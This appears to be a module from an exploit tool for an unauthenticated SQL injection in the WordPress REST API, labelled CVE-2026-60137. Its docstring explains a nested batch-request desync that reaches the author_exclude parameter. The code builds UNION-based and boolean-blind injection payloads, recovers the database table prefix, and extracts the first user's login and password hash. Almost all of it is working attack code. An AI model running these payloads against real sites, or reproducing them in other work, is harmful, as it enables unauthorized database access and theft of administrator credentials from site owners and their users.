"""CVE-2026-60137 — unauthenticated WP_Query SQL injection via nested batch.

The injectable sink (``author__not_in``, reachable through the ``author_exclude``
REST parameter) lives in the posts ``get_items`` GET handler. A single-level
batch cannot seat a GET handler, so we nest:

    OUTER = [ malformed, POST /wp/v2/posts (body = INNER batch), POST /batch/v1 ]
        -> outer desync seats serve_batch_request_v1 on the posts donor; because
           that donor was validated as a *posts* request, the inner `requests`
           array was never checked against the batch method enum -> GET allowed.
    INNER = [ malformed, POST /wp/v2/posts (body: author_exclude=<payload>),
              GET /wp/v2/posts ]
        -> inner desync seats get_items with the raw author_exclude string; its
           sanitize_params never ran, so the string reaches WP_Query -> SQLi.

Two extraction modes:
  * UNION (default): force ``per_page=500`` so WP_Query selects full ``wp_posts.*``
    rows, ``AND 1=0`` away the real rows, and UNION one fabricated publish/post
    row whose post_content is ``||HEX(<expr>)||``. One request per value, and it
    works even with zero published posts.
  * boolean-blind (fallback): ``author_exclude = "0) AND (<cond>)-- -"`` returns
    the post list when <cond> is true and empty when false (needs >=1 post).
"""

import re

from .http import send_batch
from .desync import MALFORMED

_HEX_DATE = "0x" + "2020-01-01 00:00:00".encode().hex()

# Self-check token: HEX('ORG_OK').
_SELFCHECK = "SELECT 0x4f52475f4f4b"
_SELFCHECK_VALUE = "ORG_OK"

# Default facts to pull when no explicit --expr is given.
SERVER_FACTS = [
    ("@@version", "SELECT @@version"),
    ("current_user", "SELECT CURRENT_USER()"),
    ("database", "SELECT DATABASE()"),
]


def _hexlit(s):
    return "0x" + s.encode().hex() if s else "''"


def _union_row(content_expr):
    """A 23-column wp_posts tuple; ``content_expr`` (raw SQL) fills post_content,
    the rest make it a benign published 'post' so get_items surfaces it."""
    return ",".join([
        "999999", "1", _HEX_DATE, _HEX_DATE, content_expr, _hexlit("x"), "''",
        _hexlit("publish"), _hexlit("closed"), _hexlit("closed"), "''", _hexlit("x"), "''", "''",
        _HEX_DATE, _HEX_DATE, "''", "0", "''", "0", _hexlit("post"), "''", "0"])


def _nested(url, author_exclude, extra_body=None):
    """Send the nested batch delivering ``author_exclude`` to get_items. Returns raw."""
    body = {"author_exclude": author_exclude}
    if extra_body:
        body.update(extra_body)
    inner = {"requests": [MALFORMED,
                          {"method": "POST", "path": "/wp/v2/posts", "body": body},
                          {"method": "GET", "path": "/wp/v2/posts"}]}
    outer = [MALFORMED,
             {"method": "POST", "path": "/wp/v2/posts", "body": inner},
             {"method": "POST", "path": "/batch/v1", "body": {"requests": []}}]
    return send_batch(url, outer)[1]


def union_extract(url, expr):
    """Return the scalar value of ``expr`` via a single UNION request, or None."""
    content = f"CONCAT(0x7c7c,HEX(CAST(({expr}) AS CHAR)),0x7c7c)"
    ae = "0) AND 1=0 UNION ALL SELECT " + _union_row(content) + "-- -"
    raw = _nested(url, ae, {"per_page": 500, "orderby": "none"})
    m = re.search(rb"\|\|([0-9A-Fa-f]+)\|\|", raw)
    if not m:
        return None
    h = m.group(1)
    if len(h) % 2:
        h = h[:-1]
    try:
        return bytes.fromhex(h.decode()).decode("utf-8", "replace")
    except Exception:  # noqa: BLE001
        return None


def _posts_returned(raw):
    """Largest list-of-post-objects anywhere in the (nested) response."""
    try:
        import json
        d = json.loads(raw.decode(errors="replace"))
    except Exception:  # noqa: BLE001
        return 0
    best = [0]

    def walk(o):
        if isinstance(o, list):
            if o and all(isinstance(x, dict) and "id" in x for x in o):
                best[0] = max(best[0], len(o))
            for x in o:
                walk(x)
        elif isinstance(o, dict):
            for v in o.values():
                walk(v)

    walk(d)
    return best[0]


def oracle(url, cond):
    return _posts_returned(_nested(url, f"0) AND ({cond})-- -")) > 0


def blind_extract(url, expr, maxlen=48):
    out = ""
    for pos in range(1, maxlen + 1):
        lo, hi = 0, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(url, f"ASCII(SUBSTRING(({expr}),{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        if lo == 0:
            break
        out += chr(lo)
    return out


def choose_extractor(url, maxlen=48):
    """Return ``(mode, extract_fn)``; mode is 'union', 'blind', or None."""
    if union_extract(url, _SELFCHECK) == _SELFCHECK_VALUE:
        return "union", lambda e: union_extract(url, e)
    if oracle(url, "1=1") and not oracle(url, "1=2"):
        return "blind", lambda e: blind_extract(url, e, maxlen)
    return None, None


def detect_prefix(extract):
    """Recover the DB table prefix over the SQLi (information_schema), so admin
    queries work under a custom prefix. Returns the prefix or None."""
    opts = extract("SELECT table_name FROM information_schema.tables "
                   "WHERE table_schema=DATABASE() AND table_name LIKE '%options' "
                   "ORDER BY LENGTH(table_name) ASC LIMIT 1")
    if opts and opts.endswith("options") and len(opts) > len("options"):
        return opts[:-len("options")]
    return None


def admin_facts(prefix):
    return [
        ("admin_login", f"SELECT user_login FROM {prefix}users ORDER BY ID LIMIT 1"),
        ("admin_hash", f"SELECT user_pass FROM {prefix}users ORDER BY ID LIMIT 1"),
    ]
